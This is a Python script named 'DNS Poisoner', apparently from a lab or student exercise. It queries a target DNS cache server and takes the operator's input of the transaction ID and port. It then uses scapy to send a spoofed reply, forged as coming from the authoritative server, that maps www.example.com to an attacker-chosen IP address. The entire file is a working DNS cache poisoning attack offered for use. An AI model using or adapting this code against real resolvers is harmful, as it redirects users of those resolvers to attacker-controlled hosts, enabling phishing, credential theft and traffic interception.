import argparse
import socket
from struct import pack
from time import sleep
from scapy.layers.inet import IP as SCAPY_IP, UDP as SCAPY_UDP, Ether as SCAPY_Ether
from scapy.sendrecv import send as scapySend

import base64
import dnslib

DOMAIN_NAME_TO_INJECT = 'www.example.com'


def forgeDnsQuery(domain_name: str) -> bytes:
    dnsQuery = dnslib.DNSRecord.question(domain_name)
    return dnsQuery.pack()


def forgeDnsReply(address: str, transaction_id: int) -> bytes:
    rawDnsData = base64.b64decode(
        'PGyEkAABAAEAAQACA3d3dwdleGFtcGxlA2NvbQAAAQABwAwAAQABAAAAPAAECgAAC8AQAAIAAQAAADwABgNuczHAEMA9AAEAAQAAADwABAoAAAMAACkE0AAAgAAAAA==')

    dnsReply = dnslib.DNSRecord.parse(rawDnsData)

    # change ip for DOMAIN_NAME_TO_INJECT
    dnsReply.rr[0] = dnslib.RR(DOMAIN_NAME_TO_INJECT, dnslib.QTYPE.A, rdata=dnslib.A(address), ttl=60)

    dnsReply.header.id = transaction_id
    return dnsReply.pack()


def sendSpoofedDnsUdpPacket(sourceIp, targetIp, targetPort, dns_payload):
    ipHeader = SCAPY_IP(src=sourceIp, dst=targetIp)
    udpHeader = SCAPY_UDP(sport=53, dport=targetPort)
    dnsPacket = ipHeader / udpHeader / dns_payload
    scapySend(dnsPacket, verbose=0, iface='eth0')


def parse_arguments():
    parser = argparse.ArgumentParser(description='DNS Poisoner')
    parser.add_argument('target_ip', help='IP address of the target DNS cache server')
    parser.add_argument('real_soa_ip', help='IP address of the Authoritative DNS server that we will spoof')
    parser.add_argument('ip_address', help='IP address to inject')
    args = parser.parse_args()

    # check if both domain name and IP address are valid
    try:
        socket.inet_aton(args.ip_address)
        socket.inet_aton(args.real_soa_ip)
        socket.inet_aton(args.target_ip)
    except socket.error:
        print('Invalid IP address')
        exit(1)

    return args.target_ip, args.real_soa_ip, args.ip_address


if __name__ == '__main__':
    # TODO : get the real SOA server IP automatically instead of asking the user
    targetedDnsServerIp, realSoaServerIp, ipToInject = parse_arguments()

    # send a DNS query to the targeted DNS server, and brute force the transaction ID
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)

    dns_query = forgeDnsQuery(DOMAIN_NAME_TO_INJECT)
    sock.sendto(dns_query, (targetedDnsServerIp, 53))

    print("[INFO] DNS query sent to the targeted DNS server")
    sleep(0.1)
    try:
        print()
        print("Enter the transaction ID: ", end='')
        transactionId = int(input(), 16)
        print("Enter the port number: ", end='')
        targetedDnsServerPort = int(input())
        if transactionId < 0 or targetedDnsServerPort < 0:
            print("[WARN] Invalid transaction ID or port number. Try again.")
            exit(1)

        #  get the malicious DNS reply
        maliciousDnsReply = forgeDnsReply(ipToInject, transactionId)
        sendSpoofedDnsUdpPacket(realSoaServerIp, targetedDnsServerIp, targetedDnsServerPort, maliciousDnsReply)
    except KeyboardInterrupt:
        print()
        print("[INFO] Exiting the program...")
        sock.close()
        exit(0)
